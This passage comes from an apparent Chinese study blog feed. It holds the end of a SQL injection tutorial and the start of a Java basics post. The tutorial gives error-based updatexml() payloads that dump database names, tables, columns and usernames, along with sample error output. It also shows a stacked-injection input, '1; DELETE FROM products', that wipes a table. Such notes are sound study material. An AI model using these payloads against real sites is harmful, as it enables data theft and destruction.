class="hljs-title">updatexml</span><span class="hljs-params">(xml_target,xpath_expr,new_value)</span></span><br></code></pre></td></tr></table></figure><p>这个函数有一个缺陷，如果二个参数包含<strong>特殊符号</strong>时会报错，并且会第二 个参数的内容显示在报错信息中</p><p>比如</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">3</span>);<br><br>会报错：XPATH syntax error: <span class="hljs-string">&#x27;~&#x27;</span><br></code></pre></td></tr></table></figure><p>所以可以用 <code>concat()</code> 函数将查询语句和特殊符号拼接在一起</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,version()),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~8.0.40&#x27;</span><br></code></pre></td></tr></table></figure><p><code>updatexml()</code>有长度限制，可以用 <code>limit()</code>和<code>substr()</code> 函数</p><p><strong><code>limit()</code> 函数</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">3</span>);<br><br>//可以不断改变 <span class="hljs-keyword">limit</span> num,<span class="hljs-number">1</span> 的值逐行获取<br></code></pre></td></tr></table></figure><p><img src="/SQL15.png"></p><p><strong><code>substr()</code>函数</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~admin,ctf,test,flag,user&#x27;</span><br></code></pre></td></tr></table></figure><p>获得所有数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata), <span class="hljs-number">1</span> , <span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~mysql,information_schema,perfor&#x27;</span><br></code></pre></td></tr></table></figure><p>获取所有表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;mysql&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>//XPATH syntax error: <span class="hljs-string">&#x27;~columns_priv,component,db,defau&#x27;</span><br></code></pre></td></tr></table></figure><p>获取所有字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;mysql&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;db&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>); <br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~Host,Db,User,Select_priv,Insert&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="EXTRACTVALUE-函数"><a href="#EXTRACTVALUE-函数" class="headerlink" title="EXTRACTVALUE()函数"></a><code>EXTRACTVALUE()</code>函数</h2><p>从 XML 格式的数据中提取指定节点的值</p><p>（要提取节点值的 XML 数据，要提取的节点路径）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">(xml_target,xpath_expr)</span></span><br></code></pre></td></tr></table></figure><p>报错和 <code>updatexml()</code> 函数一样，使用也差不多，但是少一个参数 x</p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p> 一堆 SQL 语句 (多条) 一起执行方法</p><p>在执行 SQL 语句时，如果 SQL 语句中包含多个 SQL 语句，数据库服务器会依次执行这些 SQL 语句，从而导致多次 SQL 注入攻击（感觉有点小像爆破）。通过在 SQL 语句中使用分号（;）来分隔多个 SQL 语句，从而实现堆叠注入攻击。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<span class="hljs-keyword">show</span> databases; <br></code></pre></td></tr></table></figure><p>堆叠注入可以执行的是<strong>任意</strong>的语句。</p><p>比如用户输入：1; DELETE FROM products </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">Select</span> * <span class="hljs-keyword">from</span> products <span class="hljs-keyword">where</span> productid=<span class="hljs-number">1</span>;<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> products<br></code></pre></td></tr></table></figure><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p><p>并不是每一个环境都适合堆叠注入，且在堆叠前还需要知道一些信息才能正常注入。</p><p>只是一些常见的注入类型，以后在学习过程中还会遇到新知识，到时候再补充嘻嘻~~~</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>SQL 注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 基础</title>
    <link href="/2024/11/09/Java/"/>
    <url>/2024/11/09/Java/</url>
    
    <content type="html"><![CDATA[<p>一些学习 Java 的笔记，篇幅有点长嘻嘻 ^__^ ~</p><span id="more"></span><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="八大数据类型"><a href="#八大数据类型" class="headerlink" title="八大数据类型"></a>八大数据类型</h2><h6 id="数值型"><a href="#数值型" class="headerlink" title="数值型"></a>数值型</h6><p>​1.整数类型（byte,short,int,long）</p><p>​2.浮点类型（float,double）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">long</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span><span class="hljs-number">30L</span>;<span class="hljs-comment">// long 型加 L</span><br><span class="hljs-type">float</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> <span class="hljs-number">50.1F</span>;<span class="hljs-comment">// float 型加 F</span><br></code></pre></td></tr></table></figure><h6 id="字符型（char）2个字节"><a href="#字符型（char）2个字节" class="headerlink" title="字符型（char）2个字节"></a>字符型（char）2个字节</h6><h6 id="布尔型（boolean）"><a href="#布尔型（boolean）" class="headerlink" title="布尔型（boolean）"></a>布尔型（boolean）</h6><h2 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h2><p>类（class） </p><p>接口（interface）</p><p>数组（[]）</p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>＋-作为单元运算符存在时，表示正负</p><p>1.＋</p><p>＋左右两边没有字符串，则进行数值运算。</p><p>＋左右两边有字符串，进行字符串拼接，如果不是字符串会<strong>转换成字符串</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">100</span>+<span class="hljs-number">98</span>);<span class="hljs-comment">//198</span><br>System.out.println(<span class="hljs-string">&#x27;a&#x27;</span>+<span class="hljs-number">1</span>);<span class="hljs-comment">//98</span><br>System.out.println(<span class="hljs-string">&quot;a&quot;</span>+<span class="hljs-number">1</span>+<span class="hljs-number">3</span>);<span class="hljs-comment">//a13</span><br>System.out.println(<span class="hljs-number">1</span>+<span class="hljs-number">3</span>+<span class="hljs-string">&quot;a&quot;</span>);<span class="hljs-comment">//4a</span><br></code></pre></td></tr></table></figure><p>2.%</p><p><strong>a%b=&#x3D;a-a&#x2F;b*b</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">10</span>%<span class="hljs-number">4</span>);<span class="hljs-comment">//2</span><br>System.out.println(-<span class="hljs-number">10</span>%<span class="hljs-number">4</span>);          <span class="hljs-comment">//-2</span><br>System.out.println(<span class="hljs-number">10</span>%-<span class="hljs-number">4</span>);<span class="hljs-comment">//2</span><br>System.out.println(-<span class="hljs-number">10</span>%-<span class="hljs-number">4</span>);<span class="hljs-comment">//-2 </span><br></code></pre></td></tr></table></figure><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>&amp; 和|不管真假都运算</p><p>HEX编码</p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><h3 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h3><p>​元素类型[ ]  数组名&#x3D; new 元素类型[数组长度]；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[]  arr=<span class="hljs-keyword">new</span>  <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><h3 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h3><p>元素类型[ ]  数组名&#x3D;new 元素类型[ ]{元素，元素，元素…};</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[]  arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[ ]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span>[] arr=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br></code></pre></td></tr></table></figure><p>相当于 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br>arr[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,arr[<span class="hljs-number">1</span>]=<span class="hljs-number">2</span>,arr[<span class="hljs-number">2</span>]=<span class="hljs-number">3</span>,arr[<span class="hljs-number">3</span>]=<span class="hljs-number">4</span>,arr[<span class="hljs-number">4</span>]=<span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>e.g</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">char</span>[] chars=&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br><span class="hljs-type">char</span> chars1[]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[]&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br></code></pre></td></tr></table></figure><h3 id="数组创建后没有赋值就是默认值"><a href="#数组创建后没有赋值就是默认值" class="headerlink" title="数组创建后没有赋值就是默认值"></a>数组创建后没有赋值就是默认值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">long</span>/<span class="hljs-type">int</span>/<span class="hljs-type">short</span>/<span class="hljs-type">byte</span> <span class="hljs-number">0</span><br><br><span class="hljs-type">float</span>/<span class="hljs-type">double</span> <span class="hljs-number">0.0</span><br><br><span class="hljs-type">boolean</span> <span class="hljs-literal">false</span><br><br>String <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h3 id="数组使用步骤"><a href="#数组使用步骤" class="headerlink" title="数组使用步骤"></a>数组使用步骤</h3><p>声明数组-&gt;开辟空间-&gt;给数组各个元素赋值-&gt;使用数组</p><h3 id="数组成员的赋值和读取"><a href="#数组成员的赋值和读取" class="headerlink" title="数组成员的赋值和读取"></a>数组成员的赋值和读取</h3><h3 id="下标越界会抛异常"><a href="#下标越界会抛异常" class="headerlink" title="下标越界会抛异常"></a>下标越界会抛异常</h3><p><strong>数组下标越界异常</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span>[] arr=new int[<span class="hljs-number">3</span>];<br><span class="hljs-attribute">System</span>.out.println(arr[<span class="hljs-number">3</span>]);//有效下标为<span class="hljs-number">0</span>，<span class="hljs-number">1</span>，<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>空指针异常</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int[] arr<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h3><p><strong>数组名.length</strong>获取数组长度</p><p>数组扩容</p><h3 id="值传递与引用传递"><a href="#值传递与引用传递" class="headerlink" title="值传递与引用传递"></a>值传递与引用传递</h3><h4 id="a-栈内存"><a href="#a-栈内存" class="headerlink" title="a.栈内存"></a>a.栈内存</h4><p>​存储局部变量，离开作用域，自动释放</p><h4 id="b-堆内存"><a href="#b-堆内存" class="headerlink" title="b.堆内存"></a>b.堆内存</h4><p>​数组和对象，通过 new 建立的实例都放在堆内存中</p><p>​当没有任何引用指向实例的时候，gc 会不定时回收</p><p>​实例中的变量都有默认初始化值，建议手动初始化</p><p>​引用类型的初始化为 null</p><h4 id="c-方法区、本地方法区"><a href="#c-方法区、本地方法区" class="headerlink" title="c.方法区、本地方法区"></a>c.方法区、本地方法区</h4><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><h3 id="二维数组定义和长度"><a href="#二维数组定义和长度" class="headerlink" title="二维数组定义和长度"></a>二维数组定义和长度</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>&#123;<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span>&#125;，<br>&#123;<span class="hljs-number">4</span>，<span class="hljs-number">5</span>，<span class="hljs-number">6</span>&#125;<br>&#125;<br><span class="hljs-type">int</span>[][] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];<br>arr[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">100</span>;<br>System.out.println(arr.length); <span class="hljs-comment">//2，二维数组长度</span><br>System.out.println(arr[<span class="hljs-number">0</span>].length);<br>System.out.println(arr[<span class="hljs-number">1</span>].length);<span class="hljs-comment">//3，个数</span><br><br><br><br>&#123;<br>&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;,<br>&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;<br>&#125;<br><span class="hljs-type">int</span>[][] arr2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][];<span class="hljs-comment">//先开辟空间，2行，再继续取列数</span><br>arr2[<span class="hljs-number">0</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>];<br>arr2[<span class="hljs-number">1</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br><br><br><br><span class="hljs-type">int</span>[][] arr3=&#123;<br>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;,<br>&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二维数组其他定义方式"><a href="#二维数组其他定义方式" class="headerlink" title="二维数组其他定义方式"></a>二维数组其他定义方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] x;<span class="hljs-type">int</span> x[];<br><span class="hljs-type">int</span>[][] y;<span class="hljs-type">int</span> y[][];<span class="hljs-type">int</span> [] y[];<br></code></pre></td></tr></table></figure><p>e.g.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span><br>String foo=<span class="hljs-string">&quot;blue&quot;</span>;<br>        <span class="hljs-type">boolean</span>[] bar=<span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span>(bar[<span class="hljs-number">0</span>])&#123;<br>            foo=<span class="hljs-string">&quot;green&quot;</span>;<br>        &#125;<br>        System.out.println(foo);<br><span class="hljs-comment">//输出blue</span><br><span class="hljs-number">2.</span><br><span class="hljs-type">char</span>[] arr1 = &#123;<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>&#125;;<br>        <span class="hljs-type">char</span>[] arr2 = arr1;<br>        arr2[<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;x&#x27;</span>;<br>        System.out.println(arr1[<span class="hljs-number">2</span>]);<br><span class="hljs-comment">//输出x</span><br><span class="hljs-number">3.</span><br>随机生成十个整数<br><span class="hljs-type">int</span>[] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            arr[i]=(<span class="hljs-type">int</span>)(Math.random()*<span class="hljs-number">100</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br>            System.out.println(arr[i]);<br>        &#125;<br><span class="hljs-comment">//倒序打印</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=arr.length-<span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--)&#123;<br>            System.out.println(arr[i]);<br>        &#125;<br><span class="hljs-comment">//求均值</span><br>        <span class="hljs-type">int</span> sum=arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;arr.length;i++)&#123;<br>            sum +=arr[i];<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;均值&quot;</span>+sum/arr.length);<br><span class="hljs-comment">//求最大值及其索引</span><br>        <span class="hljs-type">int</span> max=arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> maxIndex=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br>            <span class="hljs-keyword">if</span>(max&lt;arr[i])&#123;<br>                max=arr[i];<br>                maxIndex=i;<br>            &#125;<br>        &#125;<br>        System.out.println(max+<span class="hljs-string">&quot; &quot;</span>+maxIndex);<br></code></pre></td></tr></table></figure><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> a=<span class="hljs-number">164</span>;<br>      StringBuilder stringBuilder=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>      <span class="hljs-type">char</span>[] chars=&#123;<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>&#125;;<br>      <span class="hljs-keyword">while</span>(a&gt;<span class="hljs-number">0</span>)&#123;<br>          <span class="hljs-type">int</span> index=a%<span class="hljs-number">16</span>;<br>          <span class="hljs-type">char</span> temp=chars[index];<br>          stringBuilder.append(temp);<br>          a=a/<span class="hljs-number">16</span>;<br>      &#125;<br>      System.out.println(stringBuilder.reverse().toString());<br><br></code></pre></td></tr></table></figure><h1 id="类、属性、对象"><a href="#类、属性、对象" class="headerlink" title="类、属性、对象"></a>类、属性、对象</h1><h2 id="类的定义方法"><a href="#类的定义方法" class="headerlink" title="类的定义方法"></a>类的定义方法</h2><h3 id="方法（函数-成员方法-method-）的定义"><a href="#方法（函数-成员方法-method-）的定义" class="headerlink" title="方法（函数&#x2F;成员方法&#x2F; method ）的定义"></a>方法（函数&#x2F;成员方法&#x2F; method ）的定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">访问修饰符 返回值类型 方法名（形参列表）&#123;<br>语句；<br>...<br><span class="hljs-keyword">return</span> 返回值；<br>&#125;<br>e.g.<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">butt3rf1y</span><span class="hljs-params">()</span>&#123;...&#125;<br><span class="hljs-comment">//可以类比C语言的函数定义</span><br><br>类内部调用<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br> test();<br> &#125;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;test&quot;</span>);<br> &#125;<br>&#125;<br><br>类外部调用<br>Main.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>Cat cat=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br> cat.miao();<br> &#125;<br>&#125;<br>Cat.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> 